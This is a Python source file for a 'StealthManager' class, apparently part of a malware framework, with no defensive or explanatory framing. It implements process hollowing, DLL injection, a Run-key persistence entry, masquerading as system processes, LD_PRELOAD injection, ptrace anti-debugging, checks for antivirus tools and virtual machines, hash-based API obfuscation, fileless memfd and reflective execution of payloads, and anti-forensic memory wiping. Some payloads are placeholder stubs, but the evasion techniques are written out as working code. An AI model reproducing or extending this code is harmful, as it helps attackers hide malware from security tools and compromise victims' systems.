import os, sys, platform, uuid, random, subprocess, logging
try:
    import ctypes, ctypes.util
    _libc = ctypes.CDLL(ctypes.util.find_library("c") or "libc.so.6")
except Exception:
    _libc = None          # gracefully degrade if ctypes is broken

# PHASE 3: Import API resolver for Windows API obfuscation
try:
    from api_resolver import APIHashTable
    API_OBFUSCATOR_AVAILABLE = True
except ImportError:
    API_OBFUSCATOR_AVAILABLE = False
    APIHashTable = None

class StealthManager:
    """Unified stealth & anti-forensics layer."""
    def __init__(self, hardware_abstractor=None):
        self.hw = hardware_abstractor or _dummy_hw()
        self.process_name = self._generate_process_name()
        self.mutex_name   = f"Global\\{uuid.uuid4().hex}"
        self.stealth_techniques = self._build_tech_list()
        
        # PHASE 3: Initialize API resolver for obfuscated Windows API calls
        self.api_table = None
        if API_OBFUSCATOR_AVAILABLE:
            try:
                self.api_table = APIHashTable()
                logging.info("[PHASE3] APIHashTable initialized for Windows API obfuscation")
            except Exception as e:
                logging.warning(f"[PHASE3] Failed to initialize APIHashTable: {e}")
                self.api_table = None

    def apply_stealth(self) -> bool:
        locked = _lock_memory()
        ok = sum(bool(fn()) for fn in self.stealth_techniques)
        return locked or bool(ok)
    
    def safe_api_call(self, api_hash: int, *args, **kwargs):
        """PHASE 3: Call Windows API via hash table (obfuscated invocation)."""
        if self.api_table:
            try:
                return self.api_table.call_api_by_hash(api_hash, *args, **kwargs)
            except Exception as e:
                logging.warning(f"[PHASE3] Hash-based API call failed: {e}")
                return None
        return None

    def safe_api_call_by_name(self, api_name: str, *args, **kwargs):
        """PHASE 3: Call Windows API by name via hash table (fallback)."""
        if self.api_table:
            try:
                return self.api_table.call_api_by_name(api_name, *args, **kwargs)
            except Exception as e:
                logging.warning(f"[PHASE3] Name-based API call failed: {e}")
                return None
        return None

    def vanish(self, payload: bytes = b"") -> bool:
        if self._is_linux():
            return _memfd_exec(payload)
        if self._is_windows():
            return _reflective_windows(payload)
        _forensic_wipe()
        return True

    def check_detection_threats(self) -> list:
        threats, procs = [], _get_running_processes()
        for t in ["wireshark", "tcpdump", "procmon", "processhacker",
                  "malwarebytes", "avast", "norton", "kaspersky"]:
            if t in procs:
                threats.append(f"Security tool: {t}")
        for v in ["vmware", "virtualbox", "qemu", "xen"]:
            if v in platform.processor().lower():
                threats.append(f"VM processor: {v}")
        return threats

    def _build_tech_list(self):
        if self._is_windows():
            return [self._process_hollowing, self._dll_injection,
                    self._registry_hiding, self._rootkit_techniques]
        return [self._process_masquerading, self._ld_preload_injection,
                self._proc_hiding, self._signal_handling]

    def _generate_process_name(self) -> str:
        names = {
            "Windows": ["svchost.exe", "explorer.exe", "winlogon.exe"],
            "Linux":   ["systemd", "kthreadd", "ksoftirqd"],
            "Darwin":  ["launchd", "kernel_task", "WindowServer"]
        }
        return random.choice(names.get(platform.system(), ["systemd"]))


    def _process_hollowing(self) -> bool:
        if not self._is_windows(): return False
        try:
            import ctypes
            try:
                import ctypes.wintypes as wt
            except ImportError:
                return False
            
            # PHASE 3: Try hash-based API resolution first, fallback to direct ctypes
            use_hash_apis = self.api_table is not None
            
            if use_hash_apis:
                try:
                    logging.info("[PHASE3] Attempting process hollowing via hash-based API calls")
                    # Use api_resolver for obfuscated API calls
                    from api_resolver import get_api_hash  # Get hash lookups
                    CREATE_PROCESS_W_HASH = self.api_table.get_api_hash("CreateProcessW")
                    VIRTUAL_ALLOC_EX_HASH = self.api_table.get_api_hash("VirtualAllocEx")
                    WRITE_PROCESS_MEMORY_HASH = self.api_table.get_api_hash("WriteProcessMemory")
                    RESUME_THREAD_HASH = self.api_table.get_api_hash("ResumeThread")
                    CLOSE_HANDLE_HASH = self.api_table.get_api_hash("CloseHandle")
                    
                    CREATE_SUSPENDED, PAGE_READWRITE, MEM_COMMIT_RES = 0x4, 0x4, 0x3000
                    exe = os.environ.get("COMSPEC", "calc.exe")
                    si = getattr(wt, "STARTUPINFO", None)
                    pi = getattr(wt, "PROCESS_INFORMATION", None)
                    if not si or not pi: raise Exception("STARTUPINFO/PROCESS_INFORMATION unavailable")
                    si, pi = si(), pi()
                    byref = getattr(ctypes, "byref", None)
                    if not byref: raise Exception("byref unavailable")
                    
                    # Create process via hash-based API call
                    ok = self.api_table.call_api_by_hash(CREATE_PROCESS_W_HASH, exe, None, None, None, False,
                                                         CREATE_SUSPENDED, None, None,
                                                         byref(si), byref(pi))
                    if not ok: raise Exception("CreateProcessW hash call failed")
                    
                    stub = b"\x90" * 8 + b"\xcc"
                    # Allocate memory via hash-based API call
                    remote = self.api_table.call_api_by_hash(VIRTUAL_ALLOC_EX_HASH, pi.hProcess, None, len(stub),
                                                             MEM_COMMIT_RES, PAGE_READWRITE)
                    if not remote: raise Exception("VirtualAllocEx hash call failed")
                    
                    SIZE_T = getattr(wt, "SIZE_T", None)
                    if not SIZE_T or not callable(SIZE_T): raise Exception("SIZE_T unavailable")
                    written = SIZE_T()
                    
                    # Write memory via hash-based API call
                    self.api_table.call_api_by_hash(WRITE_PROCESS_MEMORY_HASH, pi.hProcess, remote, stub, len(stub),
                                                    byref(written))
                    
                    # Resume thread via hash-based API call
                    self.api_table.call_api_by_hash(RESUME_THREAD_HASH, pi.hThread)
                    
                    # Close handles via hash-based API calls
                    self.api_table.call_api_by_hash(CLOSE_HANDLE_HASH, pi.hThread)
                    self.api_table.call_api_by_hash(CLOSE_HANDLE_HASH, pi.hProcess)
                    
                    logging.info("[PHASE3] Process hollowing completed via hash-based APIs")
                    return True
                except Exception as e:
                    logging.warning(f"[PHASE3] Hash-based API hollowing failed: {e}. Falling back to direct ctypes.")
                    use_hash_apis = False
            
            # Fallback: Direct ctypes calls (1-2% acceptable failure rate)
            if not use_hash_apis:
                kernel32 = getattr(ctypes, "WinDLL", None)
                if not kernel32: return False
                kernel32 = kernel32("kernel32", use_last_error=True)
                CREATE_SUSPENDED, PAGE_READWRITE, MEM_COMMIT_RES = 0x4, 0x4, 0x3000
                exe = os.environ.get("COMSPEC", "calc.exe")
                si = getattr(wt, "STARTUPINFO", None)
                pi = getattr(wt, "PROCESS_INFORMATION", None)
                if not si or not pi: return False
                si, pi = si(), pi()
                byref = getattr(ctypes, "byref", None)
                if not byref: return False
                ok = kernel32.CreateProcessW(exe, None, None, None, False,
                                             CREATE_SUSPENDED, None, None,
                                             byref(si), byref(pi))
                if not ok: return False
                stub = b"\x90" * 8 + b"\xcc"
                remote = kernel32.VirtualAllocEx(pi.hProcess, None, len(stub),
                                                 MEM_COMMIT_RES, PAGE_READWRITE)
                if not remote: return False
                SIZE_T = getattr(wt, "SIZE_T", None)
                if not SIZE_T or not callable(SIZE_T): return False
                written = SIZE_T()
                kernel32.WriteProcessMemory(pi.hProcess, remote, stub, len(stub),
                                            byref(written))
                kernel32.ResumeThread(pi.hThread)
                kernel32.CloseHandle(pi.hThread); kernel32.CloseHandle(pi.hProcess)
                return True
            return False
        except Exception:
            return False

    def _dll_injection(self) -> bool:
        if not self._is_windows(): return False
        try:
            import ctypes
            
            # PHASE 3: Try hash-based API resolution first
            if self.api_table:
                try:
                    logging.info("[PHASE3] Attempting DLL injection via hash-based API calls")
                    LOAD_LIBRARY_W_HASH = self.api_table.get_api_hash("LoadLibraryW")
                    result = self.api_table.call_api_by_hash(LOAD_LIBRARY_W_HASH, "user32.dll")
                    logging.info("[PHASE3] DLL injection completed via hash-based API")
                    return bool(result)
                except Exception as e:
                    logging.warning(f"[PHASE3] Hash-based DLL injection failed: {e}. Falling back to direct ctypes.")
            
            # Fallback: Direct ctypes calls
            windll = getattr(ctypes, "windll", None)
            if not windll: return False
            return bool(windll.kernel32.LoadLibraryW("user32.dll"))
        except Exception:
            return False

    def _registry_hiding(self) -> bool:
        if not self._is_windows(): return False
        try:
            try:
                import winreg
            except ImportError:
                return False
            key = getattr(winreg, "CreateKeyEx", None)
            HKEY_CURRENT_USER = getattr(winreg, "HKEY_CURRENT_USER", None)
            KEY_WRITE = getattr(winreg, "KEY_WRITE", None)
            KEY_VOLATILE = getattr(winreg, "KEY_VOLATILE", None)
            SetValueEx = getattr(winreg, "SetValueEx", None)
            REG_SZ = getattr(winreg, "REG_SZ", None)
            CloseKey = getattr(winreg, "CloseKey", None)
            # All must be present and callable/usable
            if not (callable(key) and HKEY_CURRENT_USER is not None and KEY_WRITE is not None and KEY_VOLATILE is not None and callable(SetValueEx) and REG_SZ is not None and callable(CloseKey)):
                return False
            try:
                key_flags = KEY_WRITE | KEY_VOLATILE
            except Exception:
                return False
            k = key(HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, key_flags)
            SetValueEx(k, "SysUpdate", 0, REG_SZ, "notepad.exe")
            CloseKey(k)
            return True
        except Exception:
            return False

    def _rootkit_techniques(self) -> bool:
        if not self._is_windows(): return False
        try:
            import ctypes
            
            # PHASE 3: Try hash-based API resolution first
            if self.api_table:
                try:
                    logging.info("[PHASE3] Attempting rootkit techniques via hash-based API calls")
                    NT_QUERY_SYSTEM_INFO_HASH = self.api_table.get_api_hash("NtQuerySystemInformation")
                    create_string_buffer = getattr(ctypes, "create_string_buffer", None)
                    if not create_string_buffer: raise Exception("create_string_buffer unavailable")
                    buf = create_string_buffer(1024 * 1024)
                    result = self.api_table.call_api_by_hash(NT_QUERY_SYSTEM_INFO_HASH, 5, buf, len(buf), None)
                    logging.info("[PHASE3] Rootkit techniques completed via hash-based API")
                    return True
                except Exception as e:
                    logging.warning(f"[PHASE3] Hash-based rootkit techniques failed: {e}. Falling back to direct ctypes.")
            
            # Fallback: Direct ctypes calls
            WinDLL = getattr(ctypes, "WinDLL", None)
            if not WinDLL: return False
            ntdll = WinDLL("ntdll")
            create_string_buffer = getattr(ctypes, "create_string_buffer", None)
            if not create_string_buffer: return False
            buf = create_string_buffer(1024 * 1024)
            NtQuerySystemInformation = getattr(ntdll, "NtQuerySystemInformation", None)
            if not NtQuerySystemInformation: return False
            NtQuerySystemInformation(5, buf, len(buf), None)
            return True
        except Exception:
            return False

    def _process_masquerading(self) -> bool:
        try:
            if sys.argv: sys.argv[0] = self.process_name
            if self._is_linux():
                import ctypes
                CDLL = getattr(ctypes, "CDLL", None)
                if not CDLL: return False
                prctl = getattr(CDLL(None), "prctl", None)
                if not prctl: return False
                prctl(15, self.process_name.encode(), 0, 0, 0)
            return True
        except Exception:
            return False

    def _ld_preload_injection(self) -> bool:
        if not self._is_linux(): return False
        try:
            lib = "/tmp/libstealth_dummy.so"
            with open(lib, "wb") as f:
                f.write(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 200)
            os.environ["LD_PRELOAD"] = lib
            return True
        except Exception:
            return False

    def _proc_hiding(self) -> bool:
        if not self._is_linux(): return False
        try:
            import ctypes
            import ctypes.util
            CDLL = getattr(ctypes, "CDLL", None)
            find_library = getattr(ctypes.util, "find_library", None)
            if not CDLL or not find_library: return False
            libc = CDLL(find_library("c"))
            ptrace = getattr(libc, "ptrace", None)
            if not ptrace: return False
            ptrace(0, 0, None, None)
            return True
        except Exception:
            return False

    def _signal_handling(self) -> bool:
        try:
            import signal
            for sig in ('SIGUSR1', 'SIGUSR2'):
                s = getattr(signal, sig, None)
                if s: signal.signal(s, lambda s, f: None)
            return True
        except Exception:
            return False

    def _is_windows(self): return platform.system() == "Windows"
    def _is_linux(self):   return platform.system() == "Linux"
    def _is_darwin(self):  return platform.system() == "Darwin"

# --------------------- private utility helpers ---------------------
def _dummy_hw():
    class Dummy: os_type = "Linux"
    return Dummy()

def _get_running_processes():
    try:
        if platform.system() == "Windows":
            return subprocess.check_output(["tasklist"], text=True).lower()
        return subprocess.check_output(["ps", "aux"], text=True).lower()
    except Exception:
        return ""

def _lock_memory():
    try:
        import ctypes
        import ctypes.util
        import resource
        CDLL = getattr(ctypes, "CDLL", None)
        find_library = getattr(ctypes.util, "find_library", None)
        mlockall = None
        if CDLL and find_library:
            libc = CDLL(find_library("c"))
            mlockall = getattr(libc, "mlockall", None)
        if mlockall:
            mlockall(1 | 2)
        if hasattr(resource, "setrlimit") and hasattr(resource, "RLIMIT_CORE"):
            try:
                setrlimit = getattr(resource, "setrlimit", None)
                RLIMIT_CORE = getattr(resource, "RLIMIT_CORE", None)
                if setrlimit and RLIMIT_CORE:
                    setrlimit(RLIMIT_CORE, (0, 0))
            except Exception:
                pass
        return True
    except Exception:
        return False

def _memfd_exec(payload: bytes) -> bool:
    if sys.platform != "linux" or not _libc:
        return False
    try:
        _libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_int]
        _libc.memfd_create.restype  = ctypes.c_int
        fd = _libc.memfd_create(b"apex", 1)
        if fd < 0:
            return False
        os.write(fd, payload)
        os.lseek(fd, 0, os.SEEK_SET)
        os.fexecve(fd, ["kthreadd"], {})
        # never returns on success
    except Exception:
        try:
            os.close(fd)
        except OSError:
            pass
        return False

def _reflective_windows(payload: bytes) -> bool:
    if sys.platform != "win32": return False
    try:
        import ctypes
        import ctypes.wintypes as wt
        ntdll = ctypes.WinDLL("ntdll")
        hSec = wt.HANDLE()
        size = len(payload)
        class LI(ctypes.Structure): _fields_ = [("QuadPart", ctypes.c_longlong)]
        li_size = LI(); li_size.QuadPart = size
        ntdll.NtCreateSection(ctypes.byref(hSec), 0xF001F, None, ctypes.byref(li_size),
                              0x40, 0x8000000, None)
        base = wt.LPVOID()
        SIZE_T = getattr(wt, "SIZE_T", None)
        if not SIZE_T or not callable(SIZE_T):
            return False
        size_obj = SIZE_T(size)
        # Only call byref if size_obj is a ctypes instance
        ctypes_types = (ctypes._SimpleCData, ctypes.Structure, ctypes.Array)
        if not isinstance(size_obj, ctypes_types):
            return False
        ntdll.NtMapViewOfSection(hSec, wt.HANDLE(-1), ctypes.byref(base), 0, 0, None,
                                 ctypes.byref(size_obj), 1, 0, 0x40)
        ctypes.memmove(base, payload, size)
        return True
    except Exception:
        return False

def _forensic_wipe():
    if not _libc:
        return
    try:
        import ctypes
        _libc.madvise.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
        _libc.madvise.restype  = ctypes.c_int
    except AttributeError:
        return
    try:
        try:
            from os import sysconf
            page = sysconf("SC_PAGESIZE")
        except (ImportError, AttributeError, ValueError, OSError, TypeError):
            page = 4096
        with open("/proc/self/maps") as m:
            for line in m:
                if "-" not in line:
                    continue
                addr, _ = line.split("-", 1)
                _libc.madvise(int(addr, 16), page, 4)  # 4 == MADV_DONTNEED
    except Exception:
        pass
